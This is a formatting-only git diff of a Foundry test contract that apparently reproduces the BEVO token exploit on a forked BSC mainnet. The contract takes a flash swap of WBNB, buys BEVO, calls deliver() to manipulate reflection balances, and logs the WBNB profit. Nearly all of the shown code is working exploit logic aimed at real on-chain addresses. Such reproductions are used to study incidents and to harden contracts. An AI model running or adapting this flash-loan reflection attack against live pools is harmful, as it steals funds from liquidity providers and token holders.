@@ -22,9 +22,9 @@ contract BEVOExploit is Test {
     IUniswapV2Pair private constant bevo_wbnb = IUniswapV2Pair(0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633);
     IPancakeRouter private constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    
+
     function setUp() public {
-        cheats.createSelectFork("bsc", 25230702);
+        cheats.createSelectFork("bsc", 25_230_702);
 
         cheats.label(address(wbnb), "WBNB");
         cheats.label(address(bevo), "BEVO");
@@ -32,24 +32,25 @@ contract BEVOExploit is Test {
         cheats.label(address(bevo_wbnb), "PancakePair: BEVO-WBNB");
         cheats.label(address(router), "PancakeRouter");
     }
-    
+
     function testExploit() external {
         // flashloan WBNB from PancakePair
-        wbnb.approve(address(router), type(uint).max);
+        wbnb.approve(address(router), type(uint256).max);
         wbnb_usdc.swap(0, 192.5 ether, address(this), new bytes(1));
         emit log_named_decimal_uint("WBNB balance after exploit", wbnb.balanceOf(address(this)), 18);
     }
 
-    function pancakeCall(address /*sender*/, uint /*amount0*/, uint /*amount1*/, bytes calldata /*data*/) external {
+    function pancakeCall(
+        address, /*sender*/
+        uint256, /*amount0*/
+        uint256, /*amount1*/
+        bytes calldata /*data*/
+    ) external {
         address[] memory path = new address[](2);
         path[0] = address(wbnb);
         path[1] = address(bevo);
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            wbnb.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            wbnb.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
 
         bevo.deliver(bevo.balanceOf(address(this)));
@@ -61,6 +62,7 @@ contract BEVOExploit is Test {
     }
 }
 /* -------------------- Interface -------------------- */
+
 interface reflectiveERC20 {
     function transfer(address to, uint256 amount) external returns (bool);
     function approve(address spender, uint256 amount) external returns (bool);
